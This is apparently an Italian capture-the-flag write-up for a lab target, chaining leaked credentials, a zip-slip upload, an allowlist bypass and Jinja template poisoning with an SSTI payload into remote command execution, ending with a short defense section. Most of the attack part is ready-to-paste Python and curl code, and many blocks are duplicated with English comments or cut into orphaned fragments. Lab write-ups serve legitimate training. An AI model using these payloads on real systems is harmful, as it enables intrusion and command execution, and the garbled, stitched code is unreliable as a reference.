The Hollow Shell: zip-slip nell'upload, poi SSTI, poi shell

Un portale invita a caricare una «shell» — un pacchetto .zip di ambiance balneare per i tablet delle camere. La room ti sussurra di cercare degli «automation hook»: non farlo, sono un depistaggio. La vera catena è un estrattore di zip che si fida dei nomi dei file, un allowlist che guarda dalla parte sbagliata, e un dettaglio della cache dei template di Jinja che trasforma una scrittura arbitraria in RCE. Qui sotto ogni comando è pronto da incollare, sostituendo <target> col tuo IP.

// TL;DR
  • Credenziali in un commento HTML multilinea in /login; login → cookie di sessione.
  • Zip-slip: l'upload estrae le entry del .zip senza sanificare i ../ → scrittura di file arbitraria fuori dalla cartella.
  • Allowlist aggirata: il controllo guarda i file dichiarati nel manifest, non quelli estratti.
  • Da write a RCE: sovrascrivo un template Jinja con un payload SSTI, poi martello /dashboard col trucco fresh-worker finché il template avvelenato viene servito.

[01] Ricognizione

Due porte: SSH (22) e un'app Flask servita da gunicorn (5000). SSH è fuori discussione, quindi la 5000 è l'unica strada; la root fa un redirect a /login.

# scan

5000/tcp  open  http     Gunicorn
# la root manda al login

[02] Le credenziali nel commento (e il cookie)

Prima regola web-CTF: leggi il sorgente. Le credenziali sono in un commento HTML multilinea (una regex <!--.*?--> senza DOTALL se lo perde).

# scarica la pagina di login e leggi il commento
curl -s http://<target>:5000/login | sed -n '/<!--/,/-->/p'

# effettua il login salvando il cookie di sessione in cookie.txt

# fetch the login page and read the comment

# log in, saving the session cookie into cookie.txt

     -d "username=concierge&password=<PASSWORD>"
# the dashboard is now reachable with -b cookie.txt

La dashboard permette di caricare una «shell»: un .zip con un manifest shell.json che elenca gli asset. Da qui parte tutto.

[03] Zip-slip: il primitivo di scrittura

Un .zip può contenere entry il cui nome include ../. Se l'estrattore fa un banale join(dest, entry.name) senza normalizzare, quei ../ risalgono l'albero e scrivono fuori dalla cartella prevista. Prima carico una shell normale per capire dove finisce e leggerne l'id.

# 1) costruisci una shell benigna
python3 - <<'EOF'
import zipfile, json
z = zipfile.ZipFile("shell.zip","w")
z.writestr("shell.json", json.dumps({"name":"probe","assets":["bg.png"]}))
z.writestr("bg.png", b"\x89PNG\r\n\x1a\n")
z.close()
EOF

# 2) caricala e 3) leggi l'<id> assegnato dalla dashboard
curl -s -b cookie.txt -F "shell=@shell.zip" http://<target>:5000/upload -o /dev/null
ID=$(curl -s -b cookie.txt http://<target>:5000/dashboard | grep -oP 'shells/\K[0-9a-f]+' | tail -1)
echo "ID=$ID"
# 1) build a benign shell
python3 - <<'EOF'

z = zipfile.ZipFile("shell.zip","w")
z.writestr("shell.json", json.dumps({"name":"probe","assets":["bg.png"]}))

# 2) upload it and 3) read the <id> the dashboard assigns

Gli asset sono serviti su /shells/<id>/<file>: è il mio canale di lettura. Ora provo lo slip scrivendo dentro quella stessa cartella con un'entry che risale di due livelli.

# entry ../../shells/$ID/p2.json -> deve riapparire servita
python3 - "$ID" <<'EOF'
import zipfile, json, sys
ID=sys.argv[1]
z=zipfile.ZipFile("slip.zip","w")
z.writestr("shell.json", json.dumps({"name":"slip","assets":["bg.png"]}))
z.writestr("bg.png", b"\x89PNG\r\n\x1a\n")
z.writestr(f"../../shells/{ID}/p2.json", '{"slipped":true}')
z.close()
EOF
curl -s -b cookie.txt -F "shell=@slip.zip" http://<target>:5000/upload -o /dev/null
curl -s -o /dev/null -w "%{http_code}\n" http://<target>:5000/shells/$ID/p2.json
200   # scrittura fuori cartella CONFERMATA
# entry ../../shells/$ID/p2.json -> must reappear served
python3 - "$ID" <<'EOF'
import zipfile, json, sys

z=zipfile.ZipFile("slip.zip","w")

curl -s -b cookie.txt -F "shell=@slip.zip" http://<target>:5000/upload -o /dev/null

/shells/<id>/<file> passa da safe_join (niente ../ nella URL) e i symlink nell'archivio finiscono come file di testo. Posso rileggere solo ciò che scrivo sotto shells/ — per leggere altrove serve esecuzione.

[04] L'allowlist che guarda dalla parte sbagliata

Il portale dichiara di accettare solo png jpg gif svg css json. Ma il controllo itera sulla lista assets del manifest — ciò che l'archivio dichiara — non sui file realmente estratti. Un file non dichiarato (un template .html) finisce comunque su disco. Allowlist + zip-slip = scrivo qualunque file, ovunque. Nota: nel payload SSTI del prossimo passo NON serve conoscere l'<id>, perché ../../ dalla dir della shell atterra nella base dell'app.

[05] Da «scrivo un file» a RCE: template poisoning + fresh-worker

La scrittura arbitraria non è ancora esecuzione. Diversi tentativi ovvi non pagano (SSTI diretta sul campo name: escaped; chiave SSH nelle home: niente write; cron: non root). Il vettore giusto è l'app: sovrascrivo un template Jinja, che Flask valuta lato server. Scrivo il payload al posto di login.html E dashboard.html.

# costruisci uno zip che sovrascrive i template con un payload SSTI
python3 - <<'EOF'
import zipfile, json
P = 'ZQ7X={{ 7*7 }}<pre>{{ config.__class__.__init__.__globals__["os"].popen(request.args.get("c","id")).read() }}</pre>'
z = zipfile.ZipFile("rce.zip","w")
z.writestr("shell.json", json.dumps({"name":"rce","assets":["bg.png"]}))
z.writestr("bg.png", b"\x89PNG\r\n\x1a\n")
for t in ("login.html","dashboard.html"):
    z.writestr(f"../../templates/{t}", P)   # zip-slip nella dir dei template
z.close()
EOF
curl -s -b cookie.txt -F "shell=@rce.zip" http://<target>:5000/upload -o /dev/null
# build a zip that overwrites the templates with an SSTI payload
python3 - <<'EOF'
import zipfile, json
P = 'ZQ7X={{ 7*7 }}<pre>{{ config.__class__.__init__.__globals__["os"].popen(request.args.get("c","id")).read() }}</pre>'
z = zipfile.ZipFile("rce.zip","w")
z.writestr("shell.json", json.dumps({"name":"rce","assets":["bg.png"]}))
z.writestr("bg.png", b"\x89PNG\r\n\x1a\n")
for t in ("login.html","dashboard.html"):
    z.writestr(f"../../templates/{t}", P)   # zip-slip into the templates dir
z.close()
EOF
curl -s -b cookie.txt -F "shell=@rce.zip" http://<target>:5000/upload -o /dev/null
// l'ostacolo: la cache dei template

Gunicorn ha più worker e nessun auto-reload; Jinja mette in cache ogni template alla prima render di quel worker. login.html è già in cache ovunque, quindi il file avvelenato viene ignorato.

// la soluzione: fresh-worker

dashboard.html è servito molto meno: martellando /dashboard prima o poi cadi su un worker che lo carica per la prima volta — avvelenato. Il marker ZQ7X ti dice quando è successo. Il loop qui sotto itera finché non lo trova, poi legge l'output del comando.

# martella /dashboard finché risponde il worker avvelenato (marker ZQ7X)
for i in $(seq 1 80); do
  out=$(curl -s -b cookie.txt "http://<target>:5000/dashboard?c=id")
  echo "$out" | grep -q ZQ7X && { echo "$out" | grep -oP '(?<=<pre>).*?(?=</pre>)'; break; }
done
uid=996(roomservice) gid=996(roomservice)   # RCE come roomservice
# hammer /dashboard until the poisoned worker answers (marker ZQ7X)
for i in $(seq 1 80); do

done

[06] La flag — e il depistaggio degli hook

Stesso loop, cambia solo il comando: leggo la flag nella home di roomservice. Da dire chiaro: gli «automation hook» promessi dalla room non esistono nell'app in esecuzione (testati ~900 nomi di chiave, cinque forme di manifest, file separati e callback di rete: nessuno esegue). È un depistaggio, e riconoscerlo è parte della sfida.

# stesso loop di [05], stavolta il comando legge la flag:
for i in $(seq 1 80); do
  out=$(curl -s -b cookie.txt "http://<target>:5000/dashboard?c=cat%20/home/roomservice/flag.txt")
  echo "$out" | grep -q ZQ7X && { echo "$out" | grep -oP '(?<=<pre>).*?(?=</pre>)'; break; }
done
THM{████████████████████}   # in chiaro solo sul TUO target (qui: policy)
# same loop as [05], this time the command reads the flag:
for i in $(seq 1 80); do
  out=$(curl -s -b cookie.txt "http://<target>:5000/dashboard?c=cat%20/home/roomservice/flag.txt")
  echo "$out" | grep -q ZQ7X && { echo "$out" | grep -oP '(?<=<pre>).*?(?=</pre>)'; break; }
done
THM{████████████████████}   # cleartext only on YOUR target (here: policy)
// flag — OSCURATA

La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo Enter lo batti tu.

[07] Difesa

Allowlist sui file dichiaratiValidare i file realmente estratti, non il manifest; rifiutare l'intero archivio se contiene extra

// verdetto

Tre errori classici — fiducia nei nomi dei file di un archivio, validazione sul dato sbagliato, e un motore di template che valuta input — più un depistaggio narrativo. Il nome dice tutto: uno «slip» in uno zip che diventa una shell. In una frase: non fidarti mai di ciò che un archivio dichiara di essere, né di dove dice di volersi estrarre.
